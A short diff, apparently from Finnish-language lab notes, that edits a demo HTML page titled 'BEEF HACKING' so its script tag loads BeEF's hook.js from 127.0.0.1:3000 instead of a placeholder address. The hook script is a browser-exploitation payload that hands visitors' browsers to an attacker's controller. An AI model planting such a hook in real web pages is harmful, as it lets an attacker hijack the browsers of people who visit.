@@ -311,7 +311,7 @@ luo tyhjä index html sivusto esim. alemman formaattin mukaan ja ei tarvi olla t
 <html>
   <head>
     <title>BEEF HACKING</title>
-      <script src="http://<beef-ip-add>:3000/hook.js"></script>
+      <script src="http://127.0.0.1:3000/hook.js"></script>
   </head>
   <body>
     <h1>YOU HAVE BEEN HACKED!!!</h1>
